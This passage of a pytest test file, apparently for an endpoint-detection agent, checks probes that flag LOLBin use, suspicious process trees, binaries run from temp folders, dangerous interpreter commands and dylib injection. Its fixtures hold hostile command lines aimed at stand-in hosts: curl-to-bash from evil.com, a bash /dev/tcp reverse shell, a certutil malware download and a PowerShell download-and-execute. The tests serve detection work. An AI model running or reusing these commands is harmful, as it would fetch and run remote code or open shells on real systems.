                "cmdline": ["nc", "-l", "4444"],
                "username": "user",
                "ppid": 100,
                "create_time": 1700000001.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc1, proc2]
        events = probe.scan(_make_context())

        assert len(events) == 1
        assert events[0].event_type == "process_spawned"
        assert events[0].data["pid"] == 200
        assert events[0].data["name"] == "nc"
        assert events[0].data["process_guid"]  # non-empty


# =============================================================================
# Test: LOLBinExecutionProbe
# =============================================================================


class TestLOLBinExecutionProbe:
    """Test the LOLBinExecutionProbe."""

    def test_probe_attributes(self):
        """Verify probe metadata."""
        probe = LOLBinExecutionProbe()
        assert probe.name == "lolbin_execution"
        assert "T1218" in probe.mitre_techniques

    def test_platform_selection(self):
        """Probe selects LOLBin list based on platform."""
        probe = LOLBinExecutionProbe()
        system = platform.system()
        if system == "Darwin":
            assert "osascript" in probe.lolbins
        elif system == "Linux":
            assert "systemctl" in probe.lolbins

    @patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", False)
    def test_scan_returns_empty_when_psutil_unavailable(self):
        """Should return empty list when psutil not available."""
        probe = LOLBinExecutionProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.psutil")
    def test_detects_lolbin_execution(self, mock_psutil):
        """Should detect known LOLBin execution."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        probe = LOLBinExecutionProbe()
        # Inject a known LOLBin into the probe's dict
        probe.lolbins = {"curl": "File download", "nc": "Network utility"}

        proc_curl = _mock_proc(
            {
                "pid": 300,
                "name": "curl",
                "exe": "/usr/bin/curl",
                "cmdline": ["curl", "http://example.com"],
                "username": "user",
                "ppid": 1,
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_curl]
        events = probe.scan(_make_context())
        assert len(events) == 1
        assert events[0].event_type == "lolbin_execution"
        assert events[0].data["binary"] == "curl"
        assert events[0].data["category"] == "File download"

    @patch("amoskys.agents.proc.probes.psutil")
    def test_detects_suspicious_lolbin_pattern(self, mock_psutil):
        """Suspicious curl downloading .exe should be HIGH severity."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        probe = LOLBinExecutionProbe()
        probe.lolbins = {"curl": "File download"}

        proc_curl = _mock_proc(
            {
                "pid": 301,
                "name": "curl",
                "exe": "/usr/bin/curl",
                "cmdline": [
                    "curl",
                    "-o",
                    "payload.exe",
                    "https://evil.com/payload.exe",
                ],
                "username": "user",
                "ppid": 1,
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_curl]
        events = probe.scan(_make_context())
        assert len(events) == 1
        assert events[0].severity == Severity.HIGH
        assert "downloading_executable" in events[0].data["suspicious_patterns"]
        assert events[0].confidence == 0.7

    def test_check_suspicious_usage_encoded_command(self):
        """Detect encoded command pattern in PowerShell."""
        probe = LOLBinExecutionProbe()
        patterns = probe._check_suspicious_usage(
            "powershell.exe", "powershell.exe -enc QWRtaW4="
        )
        assert "encoded_command" in patterns

    def test_check_suspicious_usage_hidden_execution(self):
        """Detect hidden execution pattern."""
        probe = LOLBinExecutionProbe()
        patterns = probe._check_suspicious_usage(
            "bash", "nohup bash -c 'wget evil.com' &>/dev/null"
        )
        assert "hidden_execution" in patterns

    def test_check_suspicious_usage_network_activity(self):
        """Detect network activity from certutil.exe."""
        probe = LOLBinExecutionProbe()
        patterns = probe._check_suspicious_usage(
            "certutil.exe",
            "certutil.exe -urlcache -split -f http://evil.com/malware.exe",
        )
        assert "network_activity" in patterns

    def test_check_suspicious_usage_no_match(self):
        """No suspicious patterns for benign command."""
        probe = LOLBinExecutionProbe()
        patterns = probe._check_suspicious_usage("ls", "ls -la /tmp")
        assert patterns == []


# =============================================================================
# Test: ProcessTreeAnomalyProbe
# =============================================================================


class TestProcessTreeAnomalyProbe:
    """Test the ProcessTreeAnomalyProbe."""

    def test_probe_attributes(self):
        """Verify probe metadata."""
        probe = ProcessTreeAnomalyProbe()
        assert probe.name == "process_tree_anomaly"
        assert "T1055" in probe.mitre_techniques

    @patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", False)
    def test_scan_returns_empty_when_psutil_unavailable(self):
        """Should return empty list when psutil not available."""
        probe = ProcessTreeAnomalyProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.psutil")
    def test_detects_suspicious_parent_child(self, mock_psutil):
        """Should detect Word spawning PowerShell."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        parent_mock = MagicMock()
        parent_mock.name.return_value = "Microsoft Word"
        mock_psutil.Process.return_value = parent_mock

        child_proc = _mock_proc(
            {
                "pid": 400,
                "name": "powershell",
                "ppid": 300,
                "cmdline": ["powershell", "-enc", "abc"],
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [child_proc]
        probe = ProcessTreeAnomalyProbe()
        events = probe.scan(_make_context())

        assert len(events) == 1
        assert events[0].event_type == "suspicious_process_tree"
        assert events[0].severity == Severity.HIGH
        assert "Office macro" in events[0].data["reason"]

    @patch("amoskys.agents.proc.probes.psutil")
    def test_no_event_for_normal_tree(self, mock_psutil):
        """Should not fire for normal parent-child (bash -> ls)."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        parent_mock = MagicMock()
        parent_mock.name.return_value = "bash"
        mock_psutil.Process.return_value = parent_mock

        child_proc = _mock_proc(
            {
                "pid": 401,
                "name": "ls",
                "ppid": 100,
                "cmdline": ["ls", "-la"],
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [child_proc]
        probe = ProcessTreeAnomalyProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.psutil")
    def test_handles_parent_access_denied(self, mock_psutil):
        """Should skip process when parent lookup raises AccessDenied."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied
        mock_psutil.Process.side_effect = psutil.AccessDenied(pid=0)

        child_proc = _mock_proc(
            {
                "pid": 402,
                "name": "cmd",
                "ppid": 999,
                "cmdline": ["cmd"],
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [child_proc]
        probe = ProcessTreeAnomalyProbe()
        events = probe.scan(_make_context())
        assert events == []


# =============================================================================
# Test: HighCPUAndMemoryProbe
# =============================================================================


class TestHighCPUAndMemoryProbe:
    """Test the HighCPUAndMemoryProbe."""

    def test_probe_attributes(self):
        """Verify probe metadata."""
        probe = HighCPUAndMemoryProbe()
        assert probe.name == "high_cpu_memory"
        assert "T1496" in probe.mitre_techniques

    @patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", False)
    def test_scan_returns_empty_when_psutil_unavailable(self):
        """Should return empty list when psutil not available."""
        probe = HighCPUAndMemoryProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.psutil")
    def test_first_scan_records_high_pid_no_event(self, mock_psutil):
        """First scan for high-resource PID should record but not emit event."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_high = _mock_proc(
            {
                "pid": 500,
                "name": "miner",
                "cpu_percent": 95.0,
                "memory_percent": 10.0,
                "username": "user",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_high]

        probe = HighCPUAndMemoryProbe()
        events = probe.scan(_make_context())
        assert events == []
        assert 500 in probe.high_resource_pids

    @patch("amoskys.agents.proc.probes.psutil")
    def test_sustained_high_usage_triggers_event(self, mock_psutil):
        """Event emitted after sustained high usage exceeds threshold."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_high = _mock_proc(
            {
                "pid": 501,
                "name": "cryptominer",
                "cpu_percent": 99.0,
                "memory_percent": 10.0,
                "username": "attacker",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_high]

        probe = HighCPUAndMemoryProbe()
        # First scan - records PID
        probe.scan(_make_context())
        # Fake it was first seen 120 seconds ago (> SUSTAINED_SECONDS=60)
        probe.high_resource_pids[501] = time.time() - 120
        # Second scan - should fire
        events = probe.scan(_make_context())
        assert len(events) == 1
        assert events[0].event_type == "high_resource_process"
        assert events[0].severity == Severity.MEDIUM
        assert events[0].data["name"] == "cryptominer"
        assert events[0].data["cpu_percent"] == 99.0

    @patch("amoskys.agents.proc.probes.psutil")
    def test_high_memory_triggers_tracking(self, mock_psutil):
        """High memory (above threshold) should also be tracked."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_mem = _mock_proc(
            {
                "pid": 502,
                "name": "leak",
                "cpu_percent": 1.0,
                "memory_percent": 55.0,
                "username": "user",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_mem]

        probe = HighCPUAndMemoryProbe()
        probe.scan(_make_context())
        assert 502 in probe.high_resource_pids

    @patch("amoskys.agents.proc.probes.psutil")
    def test_cleanup_removes_gone_pids(self, mock_psutil):
        """PIDs that drop below threshold should be cleaned up."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        probe = HighCPUAndMemoryProbe()
        probe.high_resource_pids[999] = time.time() - 300

        # Now scan with empty process list (pid 999 is gone)
        mock_psutil.process_iter.return_value = []
        probe.scan(_make_context())
        assert 999 not in probe.high_resource_pids


# =============================================================================
# Test: LongLivedProcessProbe
# =============================================================================


class TestLongLivedProcessProbe:
    """Test the LongLivedProcessProbe."""

    def test_probe_attributes(self):
        """Verify probe metadata."""
        probe = LongLivedProcessProbe()
        assert probe.name == "long_lived_process"
        assert "T1036" in probe.mitre_techniques
        assert probe.scan_interval == 300.0

    @patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", False)
    def test_scan_returns_empty_when_psutil_unavailable(self):
        """Should return empty list when psutil not available."""
        probe = LongLivedProcessProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.psutil")
    def test_detects_long_lived_short_lived_process(self, mock_psutil):
        """Should detect 'grep' running for more than 1 hour."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        # grep that started 2 hours ago
        proc_grep = _mock_proc(
            {
                "pid": 600,
                "name": "grep",
                "create_time": time.time() - 7200,
                "username": "user",
            }
        )
        mock_psutil.process_iter.return_value = [proc_grep]

        probe = LongLivedProcessProbe()
        events = probe.scan(_make_context())
        assert len(events) == 1
        assert events[0].event_type == "unexpectedly_long_process"
        assert events[0].severity == Severity.MEDIUM
        assert events[0].data["name"] == "grep"
        assert events[0].data["runtime_seconds"] > 3600

    @patch("amoskys.agents.proc.probes.psutil")
    def test_ignores_normal_long_processes(self, mock_psutil):
        """Should not fire for processes not in EXPECTED_SHORT_LIVED."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_sshd = _mock_proc(
            {
                "pid": 601,
                "name": "sshd",
                "create_time": time.time() - 86400,
                "username": "root",
            }
        )
        mock_psutil.process_iter.return_value = [proc_sshd]

        probe = LongLivedProcessProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.psutil")
    def test_ignores_recently_started_short_lived(self, mock_psutil):
        """Should not fire for 'cat' that just started."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_cat = _mock_proc(
            {
                "pid": 602,
                "name": "cat",
                "create_time": time.time() - 10,
                "username": "user",
            }
        )
        mock_psutil.process_iter.return_value = [proc_cat]

        probe = LongLivedProcessProbe()
        events = probe.scan(_make_context())
        assert events == []


# =============================================================================
# Test: SuspiciousUserProcessProbe
# =============================================================================


class TestSuspiciousUserProcessProbe:
    """Test the SuspiciousUserProcessProbe."""

    def test_probe_attributes(self):
        """Verify probe metadata."""
        probe = SuspiciousUserProcessProbe()
        assert probe.name == "suspicious_user_process"
        assert "T1078" in probe.mitre_techniques

    @patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", False)
    def test_scan_returns_empty_when_psutil_unavailable(self):
        """Should return empty list when psutil not available."""
        probe = SuspiciousUserProcessProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.psutil")
    def test_detects_root_process_as_non_root(self, mock_psutil):
        """Should detect sshd running as non-root user."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_sshd = _mock_proc(
            {
                "pid": 700,
                "name": "sshd",
                "username": "attacker",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_sshd]

        probe = SuspiciousUserProcessProbe()
        events = probe.scan(_make_context())
        assert len(events) == 1
        assert events[0].event_type == "process_wrong_user"
        assert events[0].severity == Severity.HIGH
        assert events[0].data["username"] == "attacker"
        assert events[0].data["expected_user"] == "root/SYSTEM"

    @patch("amoskys.agents.proc.probes.psutil")
    def test_no_event_for_root_running_as_root(self, mock_psutil):
        """Should not fire when root-only process runs as root."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_nginx = _mock_proc(
            {
                "pid": 701,
                "name": "nginx",
                "username": "root",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_nginx]

        probe = SuspiciousUserProcessProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.psutil")
    def test_no_event_for_unknown_process(self, mock_psutil):
        """Should not fire for processes not in ROOT_ONLY_PROCESSES."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_vim = _mock_proc(
            {
                "pid": 702,
                "name": "vim",
                "username": "user",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_vim]

        probe = SuspiciousUserProcessProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.psutil")
    def test_system_user_is_allowed(self, mock_psutil):
        """SYSTEM user should be treated as root-equivalent."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_sshd = _mock_proc(
            {
                "pid": 703,
                "name": "sshd",
                "username": "SYSTEM",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_sshd]

        probe = SuspiciousUserProcessProbe()
        events = probe.scan(_make_context())
        assert events == []


# =============================================================================
# Test: BinaryFromTempProbe
# =============================================================================


class TestBinaryFromTempProbe:
    """Test the BinaryFromTempProbe."""

    def test_probe_attributes(self):
        """Verify probe metadata."""
        probe = BinaryFromTempProbe()
        assert probe.name == "binary_from_temp"
        assert "T1204" in probe.mitre_techniques

    @patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", False)
    def test_scan_returns_empty_when_psutil_unavailable(self):
        """Should return empty list when psutil not available."""
        probe = BinaryFromTempProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.psutil")
    def test_detects_execution_from_tmp(self, mock_psutil):
        """Should detect binary execution from /tmp/."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_evil = _mock_proc(
            {
                "pid": 800,
                "name": "evil",
                "exe": "/tmp/evil",
                "cmdline": ["/tmp/evil", "--backdoor"],
                "username": "user",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_evil]

        probe = BinaryFromTempProbe()
        events = probe.scan(_make_context())
        assert len(events) == 1
        assert events[0].event_type == "execution_from_temp"
        assert events[0].severity == Severity.HIGH
        assert events[0].data["exe"] == "/tmp/evil"

    @patch("amoskys.agents.proc.probes.psutil")
    def test_detects_execution_from_var_tmp(self, mock_psutil):
        """Should detect binary from /var/tmp/."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_mal = _mock_proc(
            {
                "pid": 801,
                "name": "malware",
                "exe": "/var/tmp/malware",
                "cmdline": ["/var/tmp/malware"],
                "username": "root",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_mal]

        probe = BinaryFromTempProbe()
        events = probe.scan(_make_context())
        assert len(events) == 1

    @patch("amoskys.agents.proc.probes.psutil")
    def test_detects_execution_from_macos_temp(self, mock_psutil):
        """Should detect binary from /private/var/folders/ (macOS temp)."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_mac = _mock_proc(
            {
                "pid": 802,
                "name": "dropper",
                "exe": "/private/var/folders/ab/cd1234/T/dropper",
                "cmdline": ["/private/var/folders/ab/cd1234/T/dropper"],
                "username": "user",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_mac]

        probe = BinaryFromTempProbe()
        events = probe.scan(_make_context())
        assert len(events) == 1

    @patch("amoskys.agents.proc.probes.psutil")
    def test_does_not_report_same_pid_twice(self, mock_psutil):
        """Should not report the same PID more than once."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_evil = _mock_proc(
            {
                "pid": 803,
                "name": "evil",
                "exe": "/tmp/evil",
                "cmdline": ["/tmp/evil"],
                "username": "user",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_evil]

        probe = BinaryFromTempProbe()
        events1 = probe.scan(_make_context())
        events2 = probe.scan(_make_context())
        assert len(events1) == 1
        assert len(events2) == 0

    @patch("amoskys.agents.proc.probes.psutil")
    def test_no_event_for_normal_path(self, mock_psutil):
        """Should not fire for binaries in standard locations."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_normal = _mock_proc(
            {
                "pid": 804,
                "name": "bash",
                "exe": "/bin/bash",
                "cmdline": ["bash"],
                "username": "user",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_normal]

        probe = BinaryFromTempProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.psutil")
    def test_handles_none_exe(self, mock_psutil):
        """Should handle None exe gracefully."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_none = _mock_proc(
            {
                "pid": 805,
                "name": "zombie",
                "exe": None,
                "cmdline": [],
                "username": "user",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_none]

        probe = BinaryFromTempProbe()
        events = probe.scan(_make_context())
        assert events == []


# =============================================================================
# Test: ScriptInterpreterProbe
# =============================================================================


class TestScriptInterpreterProbe:
    """Test the ScriptInterpreterProbe."""

    def test_probe_attributes(self):
        """Verify probe metadata."""
        probe = ScriptInterpreterProbe()
        assert probe.name == "script_interpreter"
        assert "T1059" in probe.mitre_techniques

    @patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", False)
    def test_scan_returns_empty_when_psutil_unavailable(self):
        """Should return empty list when psutil not available."""
        probe = ScriptInterpreterProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.psutil")
    def test_detects_python_importing_socket(self, mock_psutil):
        """Should detect Python importing socket module."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_py = _mock_proc(
            {
                "pid": 900,
                "name": "python3",
                "cmdline": ["python3", "-c", "import socket; s=socket.socket()"],
                "username": "user",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_py]

        probe = ScriptInterpreterProbe()
        events = probe.scan(_make_context())
        assert len(events) == 1
        assert events[0].event_type == "suspicious_script_execution"
        assert events[0].severity == Severity.HIGH
        assert events[0].data["interpreter"] == "python3"

    @patch("amoskys.agents.proc.probes.psutil")
    def test_detects_powershell_iex(self, mock_psutil):
        """Should detect PowerShell Invoke-Expression."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_ps = _mock_proc(
            {
                "pid": 901,
                "name": "powershell",
                "cmdline": [
                    "powershell",
                    "Invoke-Expression",
                    "(New-Object Net.WebClient).DownloadString('http://evil.com')",
                ],
                "username": "user",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_ps]

        probe = ScriptInterpreterProbe()
        events = probe.scan(_make_context())
        assert len(events) == 1
        assert any("Invoke-Expression" in p for p in events[0].data["matched_patterns"])

    @patch("amoskys.agents.proc.probes.psutil")
    def test_detects_bash_reverse_shell(self, mock_psutil):
        """Should detect bash /dev/tcp reverse shell."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_bash = _mock_proc(
            {
                "pid": 902,
                "name": "bash",
                "cmdline": ["bash", "-i", ">& /dev/tcp/10.0.0.1/4444 0>&1"],
                "username": "user",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_bash]

        probe = ScriptInterpreterProbe()
        events = probe.scan(_make_context())
        assert len(events) == 1
        assert events[0].event_type == "suspicious_script_execution"

    @patch("amoskys.agents.proc.probes.psutil")
    def test_ignores_non_interpreter(self, mock_psutil):
        """Should not fire for non-interpreter processes."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_ls = _mock_proc(
            {
                "pid": 903,
                "name": "ls",
                "cmdline": ["ls", "-la"],
                "username": "user",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_ls]

        probe = ScriptInterpreterProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.psutil")
    def test_ignores_interpreter_without_suspicious_pattern(self, mock_psutil):
        """Should not fire for benign Python usage."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_py = _mock_proc(
            {
                "pid": 904,
                "name": "python3",
                "cmdline": ["python3", "manage.py", "runserver"],
                "username": "user",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_py]

        probe = ScriptInterpreterProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.psutil")
    def test_curl_pipe_to_bash_detected(self, mock_psutil):
        """Should detect curl piping to bash."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        proc_bash = _mock_proc(
            {
                "pid": 905,
                "name": "bash",
                "cmdline": ["bash", "-c", "curl http://evil.com/install.sh | bash"],
                "username": "user",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_bash]

        probe = ScriptInterpreterProbe()
        events = probe.scan(_make_context())
        assert len(events) == 1

    @patch("amoskys.agents.proc.probes.psutil")
    def test_matched_patterns_limited_to_five(self, mock_psutil):
        """matched_patterns should be limited to 5 entries."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        # Craft a cmdline that matches many patterns
        cmdline = (
            "python3 -c "
            '"import socket; import subprocess; import os; import urllib; '
            "eval('x'); exec('y'); "
            "base64 -d somefile; "
            '\\x41\\x42\\x43"'
        )
        proc_py = _mock_proc(
            {
                "pid": 906,
                "name": "python3",
                "cmdline": cmdline.split(),
                "username": "user",
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_py]

        probe = ScriptInterpreterProbe()
        events = probe.scan(_make_context())
        if events:
            assert len(events[0].data["matched_patterns"]) <= 5


# =============================================================================
# Test: DylibInjectionProbe
# =============================================================================


class TestDylibInjectionProbeUnit:
    """Test the DylibInjectionProbe."""

    def test_probe_attributes(self):
        """Verify probe metadata."""
        probe = DylibInjectionProbe()
        assert probe.name == "dylib_injection"
        assert "T1547" in probe.mitre_techniques
        assert "T1574.006" in probe.mitre_techniques

    @patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", False)
    def test_scan_returns_empty_when_psutil_unavailable(self):
        """Should return empty list when psutil not available."""
        probe = DylibInjectionProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.platform")
    def test_scan_returns_empty_on_non_darwin(self, mock_platform):
        """Should return empty on non-macOS platforms."""
        mock_platform.system.return_value = "Linux"
        probe = DylibInjectionProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.platform")
    @patch("subprocess.run")
    def test_detects_dyld_injection(self, mock_run, mock_platform):
        """Should detect DYLD_INSERT_LIBRARIES in process environment."""
        mock_platform.system.return_value = "Darwin"
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="  123 /usr/bin/evil DYLD_INSERT_LIBRARIES=/tmp/evil.dylib some_env=1\n",
            stderr="",
        )

        probe = DylibInjectionProbe()
        with patch("amoskys.agents.proc.probes.psutil") as mock_psutil:
            mock_psutil.NoSuchProcess = psutil.NoSuchProcess
            mock_psutil.AccessDenied = psutil.AccessDenied
            proc_mock = MagicMock()
            proc_mock.name.return_value = "evil"
            mock_psutil.Process.return_value = proc_mock

            events = probe.scan(_make_context())

        assert len(events) == 1
        assert events[0].event_type == "dylib_injection_detected"
        assert events[0].severity == Severity.CRITICAL
        assert "/tmp/evil.dylib" in events[0].data["dyld_insert_libraries"]

    @patch("amoskys.agents.proc.probes.platform")
    @patch("subprocess.run")
    def test_no_event_when_no_dyld(self, mock_run, mock_platform):
        """Should return empty when no processes have DYLD_INSERT_LIBRARIES."""
        mock_platform.system.return_value = "Darwin"
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="  100 /bin/bash\n  200 /usr/sbin/sshd\n",
            stderr="",
        )

        probe = DylibInjectionProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.platform")
    @patch("subprocess.run", side_effect=FileNotFoundError("ps not found"))
    def test_handles_ps_command_missing(self, mock_run, mock_platform):
        """Should handle missing ps command gracefully."""
        mock_platform.system.return_value = "Darwin"
        probe = DylibInjectionProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.platform")
    @patch("subprocess.run")
    def test_does_not_report_same_pid_twice(self, mock_run, mock_platform):
        """Should not report the same injected PID twice."""
        mock_platform.system.return_value = "Darwin"
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="  456 /bin/evil DYLD_INSERT_LIBRARIES=/tmp/bad.dylib\n",
            stderr="",
        )

        probe = DylibInjectionProbe()
        with patch("amoskys.agents.proc.probes.psutil") as mock_psutil:
            mock_psutil.NoSuchProcess = psutil.NoSuchProcess
            mock_psutil.AccessDenied = psutil.AccessDenied
            proc_mock = MagicMock()
            proc_mock.name.return_value = "evil"
            mock_psutil.Process.return_value = proc_mock

            events1 = probe.scan(_make_context())
            events2 = probe.scan(_make_context())

        assert len(events1) == 1
        assert len(events2) == 0

    @patch("amoskys.agents.proc.probes.platform")
    @patch("subprocess.run")
    def test_handles_ps_nonzero_return_code(self, mock_run, mock_platform):
        """Should return empty when ps command fails (non-zero return)."""
        mock_platform.system.return_value = "Darwin"
        mock_run.return_value = MagicMock(
            returncode=1,
            stdout="",
            stderr="ps: error",
        )

        probe = DylibInjectionProbe()
        events = probe.scan(_make_context())
        assert events == []


# =============================================================================
# Test: CodeSigningProbe
# =============================================================================


class TestCodeSigningProbeUnit:
    """Test the CodeSigningProbe."""

    def test_probe_attributes(self):
        """Verify probe metadata."""
        probe = CodeSigningProbe()
        assert probe.name == "code_signing"
        assert "T1036" in probe.mitre_techniques
        assert probe.scan_interval == 300.0

    @patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", False)
    def test_scan_returns_empty_when_psutil_unavailable(self):
        """Should return empty list when psutil not available."""
        probe = CodeSigningProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.platform")
    def test_scan_returns_empty_on_non_darwin(self, mock_platform):
        """Should return empty on non-macOS platforms."""
        mock_platform.system.return_value = "Linux"
        probe = CodeSigningProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.platform")
    @patch("os.path.exists", return_value=True)
    @patch("subprocess.run")
    def test_detects_invalid_code_signature(self, mock_run, mock_exists, mock_platform):
        """Should detect invalid code signature."""
        mock_platform.system.return_value = "Darwin"
        mock_run.return_value = MagicMock(
            returncode=3,
            stdout="",
            stderr="/usr/bin/sudo: invalid signature",
        )

        probe = CodeSigningProbe()
        events = probe.scan(_make_context())
        # Only binaries that exist will be checked; we patched os.path.exists
        assert len(events) >= 1
        assert events[0].event_type == "code_signature_invalid"
        assert events[0].severity == Severity.HIGH

    @patch("amoskys.agents.proc.probes.platform")
    @patch("os.path.exists", return_value=True)
    @patch("subprocess.run")
    def test_no_event_for_valid_signature(self, mock_run, mock_exists, mock_platform):
        """Should not fire when code signatures are valid."""
        mock_platform.system.return_value = "Darwin"
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="",
            stderr="",
        )

        probe = CodeSigningProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.platform")
